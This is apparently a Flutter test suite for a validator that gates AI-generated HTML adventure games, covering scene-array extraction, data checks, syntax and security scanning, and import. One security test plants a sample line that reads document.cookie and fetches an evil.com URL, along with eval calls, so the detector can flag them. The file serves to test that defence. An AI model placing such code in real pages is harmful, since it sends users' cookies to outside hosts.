/// F-M5-08a 生成校验闸门测试（锚桌面 `desktop/backend/tests/test_game_generator.py`
/// 六项校验语义逐字）——validateGeneratedHtml 的 structure / template / cfg /
/// syntax / security / data 六项 + GAME_SCENES 括号配对提取器（桌面
/// `_extract_scenes_literal` 修复点回归：narrative 含 `];` 不误报）+ 错误全收集
/// 不中断 + 最小合法样本经 importGame(source=generated) 落盘衔接。
///
/// 测试 seam（公共接口边界）：纯 Dart 模块公开函数 + 临时目录真实落盘。
library;

import 'dart:convert';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';

import 'package:conver_system_mobile/services/simulator/generated_game_validator.dart';
import 'package:conver_system_mobile/services/simulator/import_service.dart'
    show importGame;

/// 最小合法生成样本（六项校验全部放行的基线）。
///
/// [scenesJson] 缺省为两场景有效数据；[withCfg] 控制 cfg- 三元组是否存在。
String minValidHtml({String? scenesJson, bool withCfg = true}) {
  const scenes =
      '[{"id":"start","narrative":"你站在空地上。","choices":[{"text":"向前走","next":"forest"}]},'
      '{"id":"forest","narrative":"你走进了森林。","choices":[]}]';
  final cfgInputs = withCfg
      ? '''
<input type="hidden" id="cfg-endpoint">
<input type="hidden" id="cfg-apikey">
<input type="hidden" id="cfg-model">'''
      : '';
  return '''
<!DOCTYPE html>
<html lang="zh-CN">
<head><meta charset="UTF-8"><title>测试游戏</title></head>
<body>
<div id="game-wrap">
<div id="game-narrative"></div>
<div id="game-choices"></div>
</div>
$cfgInputs
<script>
var GAME_CONFIG = {"title":"测试世界","world":"一个用于测试的世界"};
var GAME_SCENES = ${scenesJson ?? scenes};
</script>
</body>
</html>''';
}

void main() {
  // ───────────────────────────────────────────────────────────
  // GAME_SCENES 括号配对提取器（桌面 _extract_scenes_literal 语义）
  // ───────────────────────────────────────────────────────────
  group('extractScenesLiteral — GAME_SCENES 括号配对提取（桌面语义逐字）', () {
    test('合法场景数组 → 返回含两端方括号的完整字面量', () {
      final raw = extractScenesLiteral(minValidHtml());
      expect(raw, isNotNull);
      expect(raw, startsWith('['));
      expect(raw, endsWith(']'));
      expect(json.decode(raw!), isA<List<dynamic>>());
      expect(json.decode(raw), hasLength(2));
    });

    test('HTML 中无 GAME_SCENES → null', () {
      const html = '<html><body>no scenes</body></html>';
      expect(extractScenesLiteral(html), isNull);
    });

    test('const / let 声明形态同样匹配', () {
      const html = '''<html><script>
const GAME_SCENES = [{"id":"a","narrative":"n","choices":[]}];
</script></html>''';
      final raw = extractScenesLiteral(html);
      expect(raw, isNotNull);
      expect(raw, contains('"a"'));
    });

    test('narrative 含 ]; 与 ]\\n; 不提前截断（桌面修复点回归）', () {
      final html = minValidHtml(
        scenesJson:
            '[{"id":"start","narrative":"他喃喃道：\'这不可能…\'; 黑暗吞噬了一切。」","choices":[{"text":"继续","next":"end"}]},'
            '{"id":"end","narrative":"终局。\\n];\\n后记。","choices":[]}]',
      );
      final raw = extractScenesLiteral(html);
      expect(raw, isNotNull);
      final scenes = json.decode(raw!);
      expect(scenes, hasLength(2));
      expect(scenes[0]['id'], 'start');
      expect(scenes[1]['narrative'], contains('];'));
    });

    test('字符串字面量与转义引号内 \']\' 与 \'[\' 被整体跳过', () {
      final html = minValidHtml(
        scenesJson: '[{"id":"s","narrative":"列表 [1,2] 与 ] 字符及 \\"转义引号\\"，均不截断","choices":[]}]',
      );
      final raw = extractScenesLiteral(html);
      expect(raw, isNotNull);
      final scenes = json.decode(raw!);
      expect(scenes, hasLength(1));
      expect(scenes[0]['narrative'], contains('[1,2]'));
    });

    test('单引号与反引号字符串状态均可正确闭合', () {
      final html = minValidHtml(
        scenesJson: '[{"id":"s","narrative":"单引号 \'a[b]\' 与反引号 `c]d` 维持跨层","choices":[]}]',
      );
      final raw = extractScenesLiteral(html);
      expect(raw, isNotNull);
      expect(json.decode(raw!), hasLength(1));
    });

    test('损坏数组（括号不闭合）→ null（不进入 JSON 解析）', () {
      const html =
          '<html><script>var GAME_SCENES = [{"id":"a","narrative":"n","choices":[]};</script></html>';
      expect(extractScenesLiteral(html), isNull);
    });

    test('非数组形态（字符串赋值）不匹配数组字面量 → null', () {
      const html = '<script>var GAME_SCENES = "not an array";</script>';
      expect(extractScenesLiteral(html), isNull);
    });
  });

  // ───────────────────────────────────────────────────────────
  // 单文件 data 校验（game data）
  // ───────────────────────────────────────────────────────────
  group('checkGameData — 游戏数据有效性（data field）', () {
    test('合法场景 → 通过（no error）', () {
      expect(checkGameData(minValidHtml()), isNull);
    });

    test('无 GAME_SCENES 定义 → data 错误', () {
      final err = checkGameData('<html><body>no scenes</body></html>');
      expect(err, isNotNull);
      expect(err!.message, contains('未找到'));
    });

    test('GAME_SCENES 值不是合法 JSON → JSON 解析失败', () {
      const html =
          '<html><body><script>\nvar GAME_SCENES = [not json];\n</script></body></html>';
      final err = checkGameData(html);
      expect(err, isNotNull);
      expect(err!.field, 'data');
      expect(err.message, contains('JSON'));
    });

    test('场景数组为空 → 至少需要一个场景', () {
      final err = checkGameData(minValidHtml(scenesJson: '[]'));
      expect(err, isNotNull);
      expect(err!.message, contains('至少需要一个场景'));
    });

    test('场景缺 narrative（空字符串/缺失）→ 缺少叙事文本', () {
      String errOf(String s) => checkGameData(s)!.message;
      expect(
        errOf(
          minValidHtml(scenesJson: '[{"id":"a","narrative":"","choices":[]}]'),
        ),
        contains('缺少叙事文本'),
      );
      expect(
        errOf(minValidHtml(scenesJson: '[{"id":"a","choices":[]}]')),
        contains('缺少叙事文本'),
      );
    });

    test('场景缺 choices 数组 → 数据错误', () {
      final err = checkGameData(
        minValidHtml(scenesJson: '[{"id":"a","narrative":"开头"}]'),
      );
      expect(err, isNotNull);
      expect(err!.message, contains('choices'));
    });

    test('选项缺 text / next → 数据错误', () {
      expect(
        checkGameData(
          minValidHtml(
            scenesJson: '[{"id":"a","narrative":"n","choices":[{"next":"b"}]}]',
          ),
        )!.message,
        contains('text'),
      );
      expect(
        checkGameData(
          minValidHtml(
            scenesJson: '[{"id":"a","narrative":"n","choices":[{"text":"去"}]}]',
          ),
        )!.message,
        contains('next'),
      );
    });

    test('场景 id 重复 → 数据错误（去重）', () {
      final err = checkGameData(
        minValidHtml(
          scenesJson: '[{"id":"start","narrative":"开头","choices":[]},{"id":"start","narrative":"另一个","choices":[]}]',
        ),
      );
      expect(err, isNotNull);
      expect(err!.message, contains('重复'));
    });

    test('场景 id 必须是字符串（数字 id → 数据错误）', () {
      final err = checkGameData(
        minValidHtml(scenesJson: '[{"id":5,"narrative":"n","choices":[]}]'),
      );
      expect(err, isNotNull);
      expect(err!.message, contains('必须是字符串'));
    });

    test('选项引用不存在的场景 → 引用错误', () {
      final err = checkGameData(
        minValidHtml(
          scenesJson: '[{"id":"start","narrative":"开头","choices":[{"text":"走","next":"ghost"}]}]',
        ),
      );
      expect(err, isNotNull);
      final message = err!.message;
      expect(message, contains('不存在的场景'));
      expect(message, contains('ghost'));
    });

    test('场景不是对象（元素为数字）→ 第 N 个场景不是对象', () {
      final err = checkGameData(minValidHtml(scenesJson: '[42]'));
      expect(err, isNotNull);
      expect(err!.message, contains('不是对象'));
    });

    test('场景缺 id 字段 → 第 N 个场景缺少 id', () {
      final err = checkGameData(
        minValidHtml(scenesJson: '[{"narrative":"n","choices":[]}]'),
      );
      expect(err, isNotNull);
      expect(err!.message, contains('缺少 id'));
    });

    test('选项不是对象 → 场景「s」第 N 个选项不是对象', () {
      final err = checkGameData(
        minValidHtml(
          scenesJson: '[{"id":"s","narrative":"n","choices":[{"text":"a","next":"s"}, 7]}]',
        ),
      );
      expect(err, isNotNull);
      expect(err!.message, contains('选项不是对象'));
    });

    test('场景数组为对象形态（GAME_SCENES = {...}）→ 必须是数组', () {
      final err = checkGameData(
        '<html><body><script>var GAME_SCENES = {"id":"start"};</script></body></html>',
      );
      // 对象形态（非数组字面量）不匹配数组定位正则 → 「未找到」
      expect(err, isNotNull);
      expect(err!.message, contains('未找到'));
    });

    test('自引用 next → 通过（无限循环属叙事自由）', () {
      final err = checkGameData(
        minValidHtml(
          scenesJson: '[{"id":"start","narrative":"开头","choices":[{"text":"永远留下","next":"start"}]}]',
        ),
      );
      expect(err, isNull);
    });

    test('双向循环 next → 通过（设计允许）', () {
      final err = checkGameData(
        minValidHtml(
          scenesJson: '[{"id":"a","narrative":"A","choices":[{"text":"去 B","next":"b"}]},{"id":"b","narrative":"B","choices":[{"text":"回 A","next":"a"}]}]',
        ),
      );
      expect(err, isNull);
    });
  });

  // ───────────────────────────────────────────────────────────
  // 六项校验闸门（field 命名 + 语义逐字锚桌面）
  // ───────────────────────────────────────────────────────────
  group('validateGeneratedHtml — 六项校验闸门', () {
    test('全通过样本 → 空错误列表', () {
      expect(validateGeneratedHtml(minValidHtml()), isEmpty);
    });

    test('structure：无 doctype 且无 <html> → 错误', () {
      final errors = validateGeneratedHtml('<div>no html</div>');
      final fields = errors.map((e) => e.field).toSet();
      expect(fields, contains('structure'));
    });

    test('structure：以 <!DOCTYPE html 开头或前 200 字符含 <html> 即过', () {
      expect(validateGeneratedHtml(minValidHtml()), isEmpty);
      // <html> 出现在前 200 字符内 → 通过
      final earlyHtml =
          '${'<meta charset="utf-8">' * 5}<html><body>后置骨架</body></html>';
      expect(
        validateGeneratedHtml(earlyHtml).where((e) => e.field == 'structure'),
        isEmpty,
      );
      // <html> 超出前 200 字符窗口（且无 doctype）→ structure 错误（窗口边界）
      final lateHtml =
          '${'<meta charset="utf-8">' * 30}<html><body>太晚</body></html>';
      expect(
        validateGeneratedHtml(lateHtml).where((e) => e.field == 'structure'),
        isNotEmpty,
      );
    });

    test('template：残留 <!-- GEN:config --> 标记 → 错误', () {
      final html = minValidHtml().replaceAll(
        'var GAME_CONFIG = {"title":"测试世界","world":"一个用于测试的世界"};',
        'var GAME_CONFIG = <!-- GEN:config -->;',
      );
      final errors = validateGeneratedHtml(html);
      expect(errors.map((e) => e.field), contains('template'));
    });

    test('template：小写残留标记同样命中（大小写不敏感）', () {
      final html = minValidHtml().replaceAll(
        'var GAME_CONFIG = {"title":"测试世界","world":"一个用于测试的世界"};',
        'var GAME_CONFIG = <!-- gen:config -->;',
      );
      expect(
        validateGeneratedHtml(html).where((e) => e.field == 'template'),
        isNotEmpty,
      );
    });

    test('cfg：缺任一 cfg- 输入框 → cfg 错误且列出缺件', () {
      final html = minValidHtml().replaceAll(
        'id="cfg-endpoint"',
        'id="x-endpoint"',
      );
      final errors = validateGeneratedHtml(html);
      final cfg = errors.where((e) => e.field == 'cfg').toList();
      expect(cfg, hasLength(1));
      expect(cfg.single.message, contains('cfg-endpoint'));
      expect(cfg.single.message, isNot(contains('cfg-apikey')));
    });

    test('cfg：三元组全部缺失 → cfg 错误', () {
      final errors = validateGeneratedHtml(minValidHtml(withCfg: false));
      expect(errors.map((e) => e.field), contains('cfg'));
    });

    test('cfg：cfg- id 只在注释里（假阳性）→ 判定缺失', () {
      final html = minValidHtml().replaceAll(
        '<input type="hidden" id="cfg-endpoint">',
        '<!-- <input type="hidden" id="cfg-endpoint"> 注释假配置 -->',
      );
      expect(
        validateGeneratedHtml(html).where((e) => e.field == 'cfg'),
        isNotEmpty,
      );
    });

    test('syntax：未闭合 HTML 注释 → 语法错误', () {
      final html = minValidHtml().replaceAll('</body>', '<!-- 未闭合的注释\n</body>');
      final errors = validateGeneratedHtml(html);
      expect(errors.map((e) => e.field), contains('syntax'));
    });

    test('syntax：未闭合 <script> → 语法错误', () {
      final html = '<!DOCTYPE html><html><body><script>var x=1;';
      final errors = validateGeneratedHtml(html);
      expect(errors.map((e) => e.field), contains('syntax'));
    });

    test('syntax：自闭合形态 <script/ 无闭合体 → 语法错误（标签边界判定）', () {
      final errors = validateGeneratedHtml(
        '<!DOCTYPE html><html><body><script/></body></html>',
      );
      expect(errors.map((e) => e.field), contains('syntax'));
    });

    test('syntax：畸形标签样本扫描不崩（crd 回归，宽容视为可解析）', () {
      final html =
          "<!DOCTYPE html><html><body><div><toto&>a < b</div><span></span></body></html>";
      final errors = validateGeneratedHtml(html);
      expect(errors.map((e) => e.field), isNot(contains('syntax')));
      // structure/cfg/data 等其余检查照常产出（不崩）
      expect(errors, isNotEmpty);
    });

    // ── F-40：script 开/闭标签大小写统一 + script 块内 <!-- 不按 HTML 注释误报 ──

    test('syntax F-40：大写 <SCRIPT> 未闭合 → 语法错误（开标签大小写不敏感）', () {
      final errors = validateGeneratedHtml(
        '<!DOCTYPE html><html><body><SCRIPT>var x=1;',
      );
      expect(
        errors.map((e) => e.field),
        contains('syntax'),
        reason: '开标签大小写统一后，大写 <SCRIPT> 同样进入块扫描 → 未闭合报错',
      );
    });

    test('syntax F-40：大写 <SCRIPT> 块正常闭合 → 无语法错误（开/闭同口径）', () {
      final errors = validateGeneratedHtml(
        '<!DOCTYPE html><html><body><SCRIPT>var x = 1;</SCRIPT>'
        '<DIV id="game-wrap"></DIV></body></html>',
      );
      expect(errors.map((e) => e.field), isNot(contains('syntax')));
    });

    test('syntax F-40：script 块内含 <!-- 文本（闭合）→ 不按 HTML 注释误报', () {
      final errors = validateGeneratedHtml(
        '<!DOCTYPE html><html><body><script>var msg = "<!-- note";'
        '</script><div id="game-wrap"></div></body></html>',
      );
      expect(
        errors.map((e) => e.field),
        isNot(contains('syntax')),
        reason: 'script 内容为 raw text：内部 <!-- 不是 HTML 注释，不得误判未闭合',
      );
    });

    test('syntax F-40：大写 <SCRIPT> 块内含 <!-- 无 --> 文本 → 不误报注释（此前'
        '误判「未闭合的 HTML 注释」误拒合法 HTML）', () {
      final errors = validateGeneratedHtml(
        '<!DOCTYPE html><html><body><SCRIPT>var msg = "<!--";</SCRIPT>'
        '<div id="game-wrap"></div></body></html>',
      );
      expect(
        errors.map((e) => e.field),
        isNot(contains('syntax')),
        reason: 'script 块整体跳至 </script>：内部 <!-- 不算 HTML 注释',
      );
    });

    test('syntax F-40：真实未闭合 HTML 注释仍报错（script 修复不误伤真注释）', () {
      final errors = validateGeneratedHtml(
        '<!DOCTYPE html><html><body><!-- 未闭合注释<div id="game-wrap"></div>',
      );
      expect(errors.map((e) => e.field), contains('syntax'));
    });

    test('security：含 eval → 命中键集并入错误文案', () {
      final html = minValidHtml().replaceAll(
        '</script>',
        'eval("danger");\n</script>',
      );
      final errors = validateGeneratedHtml(html);
      final sec = errors.where((e) => e.field == 'security').toList();
      expect(sec, hasLength(1));
      expect(sec.single.message, contains('eval'));
    });

    test('security：三键混合 → 键集全部列出（含中文文案前缀）', () {
      final html = minValidHtml().replaceAll(
        '</script>',
        'eval("x"); var c = document.cookie; fetch("http://evil.com/data");\n</script>',
      );
      final errors = validateGeneratedHtml(html);
      final sec = errors.where((e) => e.field == 'security').toList();
      expect(sec, hasLength(1));
      expect(sec.single.message, startsWith('检测到可疑模式：'));
      expect(sec.single.message, contains('eval'));
      expect(sec.single.message, contains('document.cookie'));
      expect(sec.single.message, contains('cross-origin-fetch'));
    });

    test('security：precomputedWarnings 传入时优先采用（不重扫）', () {
      // HTML 实际干净，但预计算声明命中 eval → 报告 security
      final errors = validateGeneratedHtml(
        minValidHtml(),
        precomputedWarnings: ['eval'],
      );
      expect(errors.where((e) => e.field == 'security'), hasLength(1));
    });

    test('security：precomputedWarnings=[] 压下真实命中（证明未重扫）', () {
      final html = minValidHtml().replaceAll(
        '</script>',
        'eval("x");\n</script>',
      );
      final errors = validateGeneratedHtml(html, precomputedWarnings: const []);
      expect(errors.where((e) => e.field == 'security'), isEmpty);
    });

    test('data：空场景数组 → data 错误', () {
      final errors = validateGeneratedHtml(minValidHtml(scenesJson: '[]'));
      expect(errors.map((e) => e.field), contains('data'));
    });

    test('全部错误收集不中断（原始垃圾输入同时爆多项）', () {
      final errors = validateGeneratedHtml('eval(1)');
      final fields = errors.map((e) => e.field).toSet();
      expect(fields, contains('structure'));
      expect(fields, contains('cfg'));
      expect(fields, contains('security'));
      expect(fields, contains('data'));
      expect(errors, hasLength(4));
    });

    test('空输入不崩且产出结构性错误', () {
      final errors = validateGeneratedHtml('');
      expect(errors.map((e) => e.field), contains('structure'));
    });

    test('错误结构可消费：每项 {field, message} 且走 == 值语义', () {
      const a = GenValidationError(field: 'cfg', message: '缺配置');
      const b = GenValidationError(field: 'cfg', message: '缺配置');
      const c = GenValidationError(field: 'data', message: '缺配置');
      expect(a, b);
      expect(a == c, isFalse);
      expect(a.hashCode, b.hashCode);
      expect(a.toString(), contains('cfg'));
      expect(a.toString(), contains('缺配置'));
    });
  });

  // ───────────────────────────────────────────────────────────
  // Falsify 对抗（证伪：让公开 API 崩溃的输入必须不崩）
  // ───────────────────────────────────────────────────────────
  group('Falsify — 边界输入不崩（对抗性回归锁定）', () {
    test('extractScenesLiteral 空串 / 纯文本 → null', () {
      expect(extractScenesLiteral(''), isNull);
      expect(extractScenesLiteral('随便一段文字'), isNull);
      expect(extractScenesLiteral('GAME_SCENES = [1,2]'), isNull);
    });

    test('vGAME_SCENES 括号永不闭合 → null（不越界）', () {
      expect(extractScenesLiteral('var GAME_SCENES = ['), isNull);
      expect(extractScenesLiteral('const GAME_SCENES = [{"id":"a"'), isNull);
    });

    test('转义序列恰在字符串末尾（越界保护）→ 不崩', () {
      final html = minValidHtml(
        scenesJson: '[{"id":"s","narrative":"尾部转义\\\\","choices":[]}]',
      );
      // 提取器按括号配对应拿到完整数组（字符串态内部转义不破坏闭合）
      final raw = extractScenesLiteral(html);
      expect(raw, isNotNull);
      expect(json.decode(raw!), hasLength(1));
    });

    test('未闭合反引号态后再闭合括号 → 提取成功不崩', () {
      final html = minValidHtml(
        scenesJson: '[{"id":"s","narrative":"含 ` 未闭合引号","choices":[]}]',
      );
      final raw = extractScenesLiteral(html);
      expect(raw, isNotNull);
      expect(json.decode(raw!), hasLength(1));
    });

    test('超长输入（~300KB）六项校验线性完成不崩', () {
      final bigMeta = '<meta charset="utf-8">' * 30000; // ~630KB
      final html = '$bigMeta\n<div>垫字段</div>';
      final errors = validateGeneratedHtml(html);
      // 结构错误（<html> 在 200 窗口之外）+ cfg 缺失 + data 缺失；无异常
      expect(errors.map((e) => e.field), contains('structure'));
    });

    test('全 < 与巨型未闭合注释输入不崩', () {
      expect(validateGeneratedHtml('<<<<<<<<'), isNotEmpty);
      final giantComment = '<!-- 未闭合${'-' * 200000}';
      final errors = validateGeneratedHtml(giantComment);
      expect(errors.map((e) => e.field), contains('syntax'));
      expect(errors.map((e) => e.field), contains('structure'));
    });

    test('GAME_SCENES 定位正则紧贴行首/无空白（let 边界）', () {
      const html =
          '<script>let GAME_SCENES=[{"id":"a","narrative":"n","choices":[]}];</script>';
      final raw = extractScenesLiteral(html);
      expect(raw, isNotNull);
      expect(json.decode(raw!), hasLength(1));
    });

    test('checkSecurity precomputedWarnings 空列表/脏列表均安全', () {
      expect(checkSecurity('clean', precomputedWarnings: const []), isEmpty);
      expect(
        checkSecurity('clean', precomputedWarnings: const ['eval']),
        hasLength(1),
      );
      expect(checkSecurity('eval(1)'), isNotEmpty);
    });
  });

  // ───────────────────────────────────────────────────────────
  // 与导入管线衔接：校验通过的合法样本可经 importGame(source=generated) 落盘
  // ───────────────────────────────────────────────────────────
  group('导入管线衔接 — 校验闸门放行即可经 importGame 落盘', () {
    late Directory parent;

    setUp(() async {
      parent = await Directory.systemTemp.createTemp('m5-08a-gen-');
    });

    tearDown(() async {
      if (await parent.exists()) {
        await parent.delete(recursive: true);
      }
    });

    test('闸门放行样本 → importGame(source=generated) 落盘成功', () async {
      final html = minValidHtml();
      expect(validateGeneratedHtml(html), isEmpty);

      final result = await importGame(
        parent,
        'generated-game.html',
        utf8.encode(html),
        source: 'generated',
      );
      expect(result.game['source'], 'generated');
      expect(result.game['type'], 'ai');
      expect(result.game['config'], {
        'endpoint': 'cfg-endpoint',
        'apikey': 'cfg-apikey',
        'model': 'cfg-model',
      });
      expect(result.warnings, isEmpty);
      expect(
        File('${parent.path}${Platform.pathSeparator}generated-game.html')
            .existsSync(),
        isTrue,
      );
    });
  });
}
